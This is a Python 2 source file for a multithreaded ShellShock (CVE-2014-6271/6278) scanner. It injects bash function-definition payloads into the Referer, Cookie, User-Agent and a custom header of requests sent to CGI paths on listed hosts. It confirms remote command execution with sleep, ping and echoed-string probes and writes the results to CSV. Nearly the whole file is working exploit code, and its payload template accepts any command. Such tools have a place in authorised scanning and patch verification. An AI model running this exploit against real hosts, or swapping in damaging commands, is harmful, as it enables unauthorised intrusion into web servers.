#!/usr/bin/env python
# Author: Mario Rivas Vivar
# https://twitter.com/Grifo

"""
Scan a list of hosts with a list of CGIs trying to exploit
 the ShellShock vulnerability with different methods and payloads (CVE-2014-6271, CVE-2014-6278)
"""

import httplib,sys,time
import pprint
import csv
import argparse

from threading import Thread
from Queue import Queue

SLEEP_TIME=9
SLEEP_DELAY=5
PING_PKTS=9
PING_DELAY=7
TEST_STRING='x4GryphF7'

TIMEOUT=10
ERRORS_TO_ABORT = 8
protocol=None
target_results = []
concurrent = 20
PERSOHEADER='test'
USER_AGENT='ShellShock-Scanner - https://github.com/gry/shellshock-scanner/'
EXPLOIT1='() { gry;};%s'
EXPLOIT2='() { _; } >_[$($())] { %s; }'
EXPLOIT=EXPLOIT2
THREADS_DEFAULT=20
PROXY=None

def request(target_host, path, headers):
    if PROXY:
        if protocol:
            path = protocol + '://' + path
        elif target_host.endswith('443'):   #https for 443,9443,...
            path = 'https://' + target_host + path
        else:
            path = 'http://' + target_host + path
        conn = httplib.HTTPConnection(PROXY, timeout=TIMEOUT)
    else:
        if protocol == 'http':
            conn = httplib.HTTPConnection(target_host, timeout=TIMEOUT)
        elif protocol == 'https':
            conn = httplib.HTTPSConnection(target_host, timeout=TIMEOUT)
        elif target_host.endswith('443'):   #https for 443,9443,...
            conn = httplib.HTTPSConnection(target_host, timeout=TIMEOUT)
        else:
            conn = httplib.HTTPConnection(target_host, timeout=TIMEOUT)
    headers=headers
    start = time.time()
    conn.request("GET", path, headers=headers)
    res = conn.getresponse()
    end = time.time()
    delay = end - start
    # print >> sys.stderr, "%s:\t[%s]\t%s %s\t%s" %(target_host, command, res.status, res.reason, delay) 
    # conn.close()
    return (res.status, res.reason, delay, res)
    
def exploit(target_host, cgi_path, command):
    # print >> sys.stderr, "Connecting to %s - %s" %(target_host, cgi_path)

    shellcode=EXPLOIT % command

    headers = {"Content-type": "application/x-www-form-urlencoded",
        "Referer": shellcode,
        "Cookie": shellcode,
        "User-Agent": shellcode,
        PERSOHEADER: shellcode,
        }
    return request(target_host, cgi_path, headers)

def testShellShock(target_host, cgi_path, command):
    try:
        status1 = reason1 = delay1 = res1= status2 = reason2 = delay2 = res2 = None
        command2 = command
        headers = {"Content-type": "application/x-www-form-urlencoded",
            "User-Agent": USER_AGENT,
            }
        status1, reason1, delay1, res1 = request(target_host, cgi_path, headers)
        status2, reason2, delay2, res2 = exploit(target_host, cgi_path, command2)
        res1.close()
        res2.close()
        # warning = delay2 > SLEEP_TIME
        # vulnerable = warning and delay2-delay1>DELAY_TIME
        return {'host': target_host,
                'cgi_path': cgi_path,
                'requests': [('normal request', status1,reason1,delay1,res1), (command2,status2,reason2,delay2,res2)],
                # 'vulnerable' : vulnerable,
                # 'warning' : warning,
                'vulnerable' : None,
                'warning' : None,
                'error': False,
                'delay_diff' : delay2-delay1
                }
    except Exception as e:
        # print e.__class__, e
        # Probably exception with the connection
        return {'host': target_host,
                'cgi_path': cgi_path,
                'requests': [('normal request',status1,reason1,delay1), (command2,status2,reason2,delay2)],
                'vulnerable' : False,
                'warning' : False,
                'error': True,
                'delay_diff' : None
                }


def testSleep(target_host, cgi_path):
    shellshocktest = testShellShock(target_host, cgi_path, "/usr/bin/env sleep %s" %SLEEP_TIME)
    if not shellshocktest['error']:
        shellshocktest['warning'] = shellshocktest['requests'][1][3] > SLEEP_TIME # Delay command request > sleep time
        shellshocktest['vulnerable'] = shellshocktest['warning'] and shellshocktest['delay_diff'] > SLEEP_DELAY
        if shellshocktest['vulnerable']: 
            print "%s%s\t VULNERABLE TO SLEEP TEST" %(target_host, cgi_path)
        print "%s%s - %s - %s - %s" %(target_host, cgi_path, "sleep test", "VULNERABLE" if shellshocktest['vulnerable'] else "False", shellshocktest['requests'][1][3])
    return shellshocktest

def testPing(target_host, cgi_path):
    shellshocktest = testShellShock(target_host, cgi_path, "/usr/bin/env ping -c%s 127.0.0.1" %PING_PKTS)
    if not shellshocktest['error']:
        shellshocktest['warning'] = shellshocktest['requests'][1][3] > PING_DELAY # Delay command request > sleep time
        shellshocktest['vulnerable'] = shellshocktest['warning'] and shellshocktest['delay_diff'] > PING_DELAY
        if shellshocktest['vulnerable']: 
            print "%s%s\t VULNERABLE TO PING TEST" %(target_host, cgi_path)
        print "%s%s - %s - %s - %s" %(target_host, cgi_path, "ping test", "VULNERABLE" if shellshocktest['vulnerable'] else "False", shellshocktest['requests'][1][3])
    return shellshocktest

"""
Dirty code everywhere :S
"""
def testString(target_host, cgi_path):
    status = reason = delay= res = status = reason = delay = res2 = None
    command = 'echo -e "Content-type: text/html\\n\\n%s">&1' %TEST_STRING
    try:
        status, reason, delay, res = exploit(target_host, cgi_path, command)
        data = res.read()
        res.close()
        warning = vulnerable = TEST_STRING in data
        if vulnerable: 
            print "%s%s\t VULNERABLE TO STRING TEST" %(target_host, cgi_path)
        shellshocktest = {'host': target_host,
                    'cgi_path': cgi_path,
                    'requests': [(command, status,reason,delay,res), (None,None,None,None,None)],
                    'vulnerable' : vulnerable,
                    'warning' : warning,
                    'error': False,
                    'delay_diff' : 0
                    }   
        print "%s%s - %s - %s - %s" %(target_host, cgi_path, "string test", "VULNERABLE" if shellshocktest['vulnerable'] else "False", shellshocktest['requests'][0][3])
        return shellshocktest
    except Exception as e:
        # print e.__class__, e
        shellshocktest = {'host': target_host,
                    'cgi_path': cgi_path,
                    'requests': [(command, status,reason,delay,res), (None,None,None,None,None)],
                    'vulnerable' : False,
                    'warning' : False,
                    'error': True,
                    'delay_diff' : 0
                    }   
        return shellshocktest


    if not shellshocktest['error']:
        shellshocktest['warning'] = shellshocktest['requests'][1][4] > PING_DELAY # Delay command request > sleep time
        shellshocktest['vulnerable'] = shellshocktest['warning'] and shellshocktest['delay_diff'] > PING_DELAY
        if shellshocktest['vulnerable']: 
            print "%s%s\t VULNERABLE" %(target_host, cgi_path)
        print "%s%s - %s - %s" %(target_host, cgi_path, shellshocktest['vulnerable'], shellshocktest['requests'][1][3])
    return shellshocktest

def testCGIList(target_host, cgi_list):
    test_list = []
    errors = 0
    for cgi_path in cgi_list:
        if 1 in ATTACKS:
            cgitest = testSleep(target_host, cgi_path)
            test_list.append(cgitest)
            if cgitest['error'] is True:
                errors +=1;
            else:
                errors = 0
            if errors >= ERRORS_TO_ABORT:
                print "%s aborted due to %s consecutive connection errors" %(cgitest['host'], ERRORS_TO_ABORT)
                break;

        if 2 in ATTACKS:
            cgitest = testPing(target_host, cgi_path)
            test_list.append(cgitest)
            if cgitest['error'] is True:
                errors +=1;
            else:
                errors = 0
            if errors >= ERRORS_TO_ABORT:
                print "%s aborted due to %s consecutive connection errors" %(cgitest['host'], ERRORS_TO_ABORT)
                break;

        if 3 in ATTACKS:
            cgitest = testString(target_host, cgi_path)
            test_list.append(cgitest)
            if cgitest['error'] is True:
                errors +=1;
            else:
                errors = 0
            if errors >= ERRORS_TO_ABORT:
                print "%s aborted due to %s consecutive connection errors" %(cgitest['host'], ERRORS_TO_ABORT)
                break;
    return test_list

def threadWork():
    global target_results
    while True:
        (target, cgi_list) = q.get()
        host_tests = testCGIList(target, cgi_list)
        target_results.append(host_tests)
        q.task_done()

def scan(target_list, cgi_list):
    global q
    q = Queue(concurrent * 2)
    for i in range(concurrent):
        t = Thread(target=threadWork)
        t.daemon = True
        t.start()
    try:
        for target in target_list:
            q.put((target, cgi_list))
        q.join()
    except KeyboardInterrupt:
        return


def writeCSV(target_results, output):
    csvf = open(output, 'w')
    csvw = csv.writer(csvf, csv.excel)
    csvw.writerow(['HOST', 'CGIPATH', 'VULNERABLE', 'ERROR','WARNING', 'COMMAND1', 'STATUS1', 'REASON1', 'DELAY1', 'COMMAND2','STATUS2', 'REASON2', 'DELAY2', 'DELAY_DIFF'])
    target_results.sort()
    for host_list in target_results:
        for test in host_list:
            l = [
                test['host'],
                test['cgi_path'],
                test['vulnerable'],
                test['error'],
                test['warning'],
                test['requests'][0][0],
                test['requests'][0][1],
                test['requests'][0][2],
                test['requests'][0][3],
                test['requests'][1][0],
                test['requests'][1][1],
                test['requests'][1][2],
                test['requests'][1][3],
                test['delay_diff']
            ]
            # pprint.pprint(l)
            csvw.writerow(l)

    csvf.close()


def main():
    parser = argparse.ArgumentParser(
        add_help=False,
        usage='%(prog)s --help',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog='''
Examples:
\tpython %(prog)s host_list.txt cgi_list.txt
\tpython %(prog)s host_list.txt cgi_list.txt -a 1 2 3 -e 2 -w results.csv --proto https -t 10
        '''
    )
    parser.add_argument('hostlist_file', help='\t\tFile of 1 host[:port] per line', metavar='<host_file>')
    parser.add_argument('cgilist_file', help='\t\tFile of 1 cgi per line', metavar='<cgi_file>')
    parser.add_argument('--proto', dest='proto', help='\t\tForce protocol', metavar='http|https')
    parser.add_argument('-t','--threads', dest='threads', help='\t\tSet number of threads', metavar='', type=int, default=THREADS_DEFAULT)
    parser.add_argument('-w','--write', dest='output', help='\t\tWrite CSV file with the results', metavar='<csv>')
    parser.add_argument('-a','--attacks', dest='attacks', help='\t\tSet attacks to test:\n\t\t\t1:Sleep test\n\t\t\t2:Ping local test\n\t\t\t3:String return test\n\t\t\tDefault: [1,2]', metavar='', type=int, nargs='+', default=[1,2])
    parser.add_argument('-e','--exploit_type', dest='exploit', help='\t\tSet exploit payload (1 or 2)', metavar='', type=int, default=2)
    parser.add_argument('-p','--proxy', dest='proxy', help='\t\tSet HTTP proxy', metavar='<host:port>', type=str)
    parser.add_argument('-h', '--help', action='help', help='\t\tPrint this help message then exit')
    options = parser.parse_args()
    hostlist_file = options.hostlist_file
    cgilist_file = options.cgilist_file
    proto = options.proto
    threads = options.threads
    output = options.output
    attacks = options.attacks
    proxy = options.proxy

    global ATTACKS
    ATTACKS = attacks

    global EXPLOIT
    if options.exploit == 1:
        EXPLOIT=EXPLOIT1
    elif options.exploit == 2:
        EXPLOIT=EXPLOIT2

    global concurrent
    concurrent = threads

    global protocol
    protocol = proto

    global PROXY
    if proxy:
        PROXY = proxy
    
    target_list = [line.strip() for line in open(hostlist_file).readlines() if len(line.strip())>0]
    cgi_list = [line.strip() for line in open(cgilist_file).readlines() if len(line.strip())>0]
    

    print "Scanning %s hosts with %s CGIs using %s Threads" %(len(target_list),len(cgi_list), threads)
    print "Attacks chosen: %s. Exploit payload: %s" %(ATTACKS, EXPLOIT % 'command')
    if proxy:
        print "Using proxy: %s" %PROXY
    if protocol:
        print "Forced protocol: %s" %protocol
    

    scan(target_list, cgi_list)

    if output is not None:
        writeCSV(target_results, output) 
    exit(0)

if __name__ == '__main__':
    main()

